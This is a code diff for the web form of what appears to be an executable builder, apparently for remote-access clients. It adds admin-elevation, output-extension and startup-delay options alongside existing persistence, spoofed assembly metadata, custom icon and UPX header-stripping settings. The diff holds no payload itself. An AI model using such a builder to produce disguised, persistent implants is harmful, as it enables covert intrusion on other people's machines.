@@ -54,6 +54,37 @@ function updateServerUrlPlaceholder() {
 
 let isBuilding = false;
 
+function initAccordions() {
+  document.querySelectorAll(".accordion-section").forEach((section) => {
+    const header = section.querySelector(".accordion-header");
+    const body = section.querySelector(".accordion-body");
+    const chevron = section.querySelector(".accordion-chevron");
+    const startOpen = section.dataset.open !== "false";
+
+    if (!startOpen) {
+      body.classList.add("collapsed");
+    } else {
+      chevron.classList.add("rotated");
+    }
+
+    header.addEventListener("click", () => {
+      const nowCollapsed = body.classList.toggle("collapsed");
+      chevron.classList.toggle("rotated", !nowCollapsed);
+    });
+  });
+}
+
+function updateWindowsSectionVisibility() {
+  const windowsSection = document.getElementById("windows-settings-section");
+  if (!windowsSection) return;
+  const hasWindows = Array.from(
+    document.querySelectorAll('input[name="platform"]:checked'),
+  ).some((el) => el.value.startsWith("windows-"));
+  windowsSection.classList.toggle("hidden", !hasWindows);
+}
+
+initAccordions();
+updateWindowsSectionVisibility();
 init();
 
 if (rawServerListCheckbox && serverUrlInput) {
@@ -133,6 +164,7 @@ if (persistenceCheckbox && persistenceMethodContainer) {
 
 platformInputs.forEach((input) => {
   input.addEventListener("change", updatePersistenceSettingsVisibility);
+  input.addEventListener("change", updateWindowsSectionVisibility);
 });
 
 updatePersistenceSettingsVisibility();
@@ -331,6 +363,10 @@ form?.addEventListener("submit", async (e) => {
   const assemblyCompany = form.querySelector("#assembly-company")?.value.trim() || "";
   const assemblyVersion = form.querySelector("#assembly-version")?.value.trim() || "";
   const assemblyCopyright = form.querySelector("#assembly-copyright")?.value.trim() || "";
+  const requireAdmin = form.querySelector('input[name="require-admin"]')?.checked || false;
+  const outputExtension = form.querySelector("#output-extension")?.value || ".exe";
+  const sleepSecondsRaw = parseInt(form.querySelector("#sleep-seconds")?.value || "0", 10);
+  const sleepSeconds = !isNaN(sleepSecondsRaw) && sleepSecondsRaw > 0 ? sleepSecondsRaw : 0;
 
   const buildConfig = {
     platforms,
@@ -354,6 +390,9 @@ form?.addEventListener("submit", async (e) => {
     assemblyCompany: assemblyCompany || undefined,
     assemblyVersion: assemblyVersion || undefined,
     assemblyCopyright: assemblyCopyright || undefined,
+    requireAdmin,
+    outputExtension,
+    sleepSeconds: sleepSeconds > 0 ? sleepSeconds : undefined,
     iconBase64: pendingIconBase64 || undefined,
     enableUpx: form.querySelector('input[name="enable-upx"]')?.checked || false,
     upxStripHeaders: form.querySelector('input[name="upx-strip-headers"]')?.checked || false,
